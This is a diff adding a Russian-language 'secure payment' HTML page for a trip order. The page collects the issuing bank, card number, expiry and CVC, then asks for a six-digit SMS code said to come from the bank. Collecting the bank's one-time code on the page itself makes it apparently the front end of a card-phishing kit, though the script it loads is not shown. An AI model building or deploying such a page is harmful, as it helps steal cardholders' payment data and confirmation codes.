@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Оплата заказа</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <div class="header-logo">
+      <div class="logo-badge">💳</div>
+      <h2>Безопасная оплата</h2>
+    </div>
+
+    <div id="orderDetails">
+      <p>Загрузка деталей заказа...</p>
+    </div>
+
+    <!-- Шаг 1: Форма карты -->
+    <form id="paymentForm">
+      <div class="input-group">
+        <label for="bankSelect">Банк-эмитент</label>
+        <select id="bankSelect" required>
+          <option value="" disabled selected>Выберите ваш банк</option>
+          <option value="СберБанк">🏛 СберБанк</option>
+          <option value="Т-Банк (Тинькофф)">🟡 Т-Банк (Тинькофф)</option>
+          <option value="Альфа-Банк">🔴 Альфа-Банк</option>
+          <option value="ВТБ">🔵 ВТБ</option>
+          <option value="Газпромбанк">🔹 Газпромбанк</option>
+          <option value="Другой банк">💳 Другой банк</option>
+        </select>
+      </div>
+
+      <div class="input-group">
+        <label for="cardNumber">Номер карты</label>
+        <input 
+          type="text" 
+          id="cardNumber" 
+          placeholder="0000 0000 0000 0000" 
+          maxlength="19" 
+          required 
+          autocomplete="off"
+        >
+      </div>
+
+      <div class="card-extra">
+        <div class="input-group">
+          <label for="cardExpiry">Срок действия</label>
+          <input type="text" id="cardExpiry" placeholder="ММ/ГГ" maxlength="5" required>
+        </div>
+        <div class="input-group">
+          <label for="cardCvc">CVC/CVV</label>
+          <input type="password" id="cardCvc" placeholder="•••" maxlength="3" required>
+        </div>
+      </div>
+
+      <button type="submit" id="payButton">Оплатить поездку</button>
+    </form>
+
+    <!-- Шаг 2: Ввод SMS -->
+    <div id="smsBlock" class="sms-box" style="display: none;">
+      <h3>Подтверждение SMS</h3>
+      <p class="sms-info">Введите 6-значный код безопасности, отправленный банком на ваш номер</p>
+      
+      <div class="input-group">
+        <input type="text" id="smsCode" placeholder="Код из SMS" maxlength="6" autocomplete="off" style="text-align: center; font-size: 1.2rem; letter-spacing: 4px; font-weight: bold;">
+      </div>
+      
+      <div id="smsMessage" class="status-msg"></div>
+
+      <button type="button" id="confirmSmsBtn">Подтвердить код</button>
+    </div>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
